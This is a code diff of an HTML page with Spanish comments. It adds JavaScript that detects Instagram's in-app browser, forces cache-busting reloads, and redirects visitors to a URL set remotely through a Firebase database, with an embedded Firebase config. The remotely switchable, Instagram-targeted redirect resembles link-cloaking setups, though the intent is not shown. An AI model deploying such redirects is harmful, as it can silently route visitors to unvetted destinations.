@@ -391,8 +391,21 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         }
     </script>
   
-    <!-- Script de redirección -->
-    <script>
+ <script>
+        // Función mejorada para detectar Instagram
+        function detectarInstagram() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            // Detección más amplia de Instagram
+            return userAgent.includes("instagram") || 
+                   userAgent.includes("insta") || 
+                   document.referrer.includes("instagram") ||
+                   /instagram|insta/i.test(userAgent);
+        }
+        
+        // Variables globales
+        const esInstagram = detectarInstagram();
+        console.log("¿Es Instagram?", esInstagram ? "Sí" : "No");
+        
         // Configuración de Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyBYqJumATSg79RlUE5e4OGbVHEUe8iDnlo",
@@ -408,7 +421,132 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+        
+        // Anti-caché específico para Instagram
+        if (esInstagram) {
+            // Añadir parámetro de caché si no existe
+            if (!window.location.href.includes('_nocache=')) {
+                const timestamp = Date.now();
+                const separador = window.location.href.includes('?') ? '&' : '?';
+                const nuevaURL = window.location.href + separador + '_nocache=' + timestamp;
+                
+                // Usar sessionStorage para evitar bucles infinitos
+                if (!sessionStorage.getItem('recargado')) {
+                    console.log("🔄 Recargando para limpiar caché de Instagram");
+                    sessionStorage.setItem('recargado', 'true');
+                    window.location.replace(nuevaURL);
+                }
+            }
+        }
+        
+        // Método seguro para redireccionar basado en el entorno
+        function redireccionar(url) {
+            console.log("🚀 Redirigiendo a:", url);
+            
+            // Asegurar que hay un parámetro anti-caché
+            if (!url.includes('_nocache=')) {
+                const timestamp = Date.now() + Math.random().toString(36).substring(2, 8);
+                const separador = url.includes('?') ? '&' : '?';
+                url = url + separador + '_nocache=' + timestamp;
+            }
+            
+            // En Instagram, técnicas especiales para evitar caché
+            if (esInstagram) {
+                // Guardar el destino en sessionStorage
+                sessionStorage.setItem('destinoRedireccion', url);
+                
+                // Doble estrategia para Instagram: historia + replace
+                window.location.href = url;
+                setTimeout(() => {
+                    window.location.replace(url);
+                }, 150);
+            } else {
+                // Para navegadores normales
+                window.location.replace(url);
+            }
+        }
 
+        // Función para verificar y aplicar la redirección predeterminada
+        function verificarRedireccionDefault() {
+            // Intentar primero con Firebase
+            database.ref("redireccionDefault").once("value")
+                .then((snapshot) => {
+                    const defaultURL = snapshot.val();
+                    
+                    // Si no hay nada en Firebase, intentar con localStorage
+                    if (!defaultURL) {
+                        console.log("No hay redirección en Firebase, verificando localStorage...");
+                        const localDefault = localStorage.getItem('ultimaRedireccionDefault');
+                        
+                        if (localDefault) {
+                            console.log("Usando redirección de localStorage:", localDefault);
+                            procesarRedireccion(localDefault);
+                        } else {
+                            console.log("No hay redirección predeterminada configurada");
+                        }
+                        return;
+                    }
+                    
+                    procesarRedireccion(defaultURL);
+                })
+                .catch(error => {
+                    console.error("Error al obtener redirección de Firebase:", error);
+                    
+                    // Plan B: Usar localStorage si hay un error con Firebase
+                    const localDefault = localStorage.getItem('ultimaRedireccionDefault');
+                    if (localDefault) {
+                        console.log("Usando redirección de respaldo:", localDefault);
+                        procesarRedireccion(localDefault);
+                    }
+                });
+        }
+        
+        // Procesar la redirección verificando si es necesario redirigir
+        function procesarRedireccion(defaultURL) {
+            if (!defaultURL) return;
+            
+            // Obtener URLs limpias para comparación
+            const urlActual = window.location.href.split(/[?#]/)[0];
+            const defaultURLLimpia = defaultURL.split(/[?#]/)[0];
+            
+            console.log("URL Actual:", urlActual);
+            console.log("URL Default:", defaultURLLimpia);
+            
+            // Si la URL actual no es la predeterminada, redirigir
+            // Nota: No redirigimos si estamos en folder.html y la predeterminada es folder.html
+            if (!defaultURLLimpia.includes('folder.html')) {
+                console.log("🔄 Aplicando redirección predeterminada");
+                
+                // Actualizar también la redirección actual para mantener todo coherente
+                database.ref("redireccion").set(defaultURL)
+                    .then(() => {
+                        console.log("✅ Redirección actual sincronizada con la predeterminada");
+                        redireccionar(defaultURL);
+                    })
+                    .catch(error => {
+                        console.error("❌ Error al sincronizar redirección:", error);
+                        // Si falla la actualización, redireccionar de todos modos
+                        redireccionar(defaultURL);
+                    });
+            } else {
+                console.log("✅ Ya estamos en la página correcta (folder.html)");
+            }
+        }
+        
+        // Ejecutar verificación al cargar la página con un pequeño retraso
+        // para dar tiempo a que todo se inicialice correctamente
+        document.addEventListener("DOMContentLoaded", () => {
+            setTimeout(verificarRedireccionDefault, 500);
+        });
+    </script>
+</head>
+<body>
+    <!-- Aquí va el contenido de tu página principal -->
+    <h1>Página Principal</h1>
+    <p>Esta página se actualizará según la redirección predeterminada.</p>
+    
+    <!-- Script de redirección para cambios en tiempo real -->
+    <script>
         // Obtener la URL actual sin parámetros
         function limpiarURL(url) {
             if (!url) return '';
@@ -418,10 +556,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         let urlActual = limpiarURL(window.location.href);
         let ultimaRedireccion = localStorage.getItem('ultimaRedireccion') || '';
         
-        console.log("URL actual:", urlActual);
-        console.log("Última redirección:", ultimaRedireccion);
-
-        // Escuchar cambios en Firebase
+        // Escuchar cambios en Firebase para redirecciones en tiempo real
         database.ref("redireccion").on("value", (snapshot) => {
             const nuevaURL = snapshot.val();
             console.log("🔄 Firebase detectó cambio:", nuevaURL);
@@ -444,26 +579,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
             localStorage.setItem('ultimaRedireccion', nuevaURL);
             ultimaRedireccion = nuevaURL;
             
-            console.log("🚀 Redirigiendo a:", nuevaURL);
-            
-            // Redirección con estrategia especial para Instagram
-            if (esInstagram) {
-                // Asegurar parámetro de anti-caché
-                if (!nuevaURL.includes('_nocache=') && !nuevaURL.includes('nocache=')) {
-                    const timestamp = Date.now() + Math.random().toString(36).substring(2, 8);
-                    const separador = nuevaURL.includes('?') ? '&' : '?';
-                    nuevaURL = nuevaURL + separador + '_nocache=' + timestamp;
-                }
-                
-                // En Instagram, usar enfoque de doble redirección
-                window.location.href = nuevaURL;
-                setTimeout(() => {
-                    window.location.replace(nuevaURL);
-                }, 100);
-            } else {
-                // Para navegadores normales
-                window.location.replace(nuevaURL);
-            }
+            // Usar la función de redirección segura
+            redireccionar(nuevaURL);
         }, (error) => {
             console.error("❌ Error al obtener redirección:", error);
         });
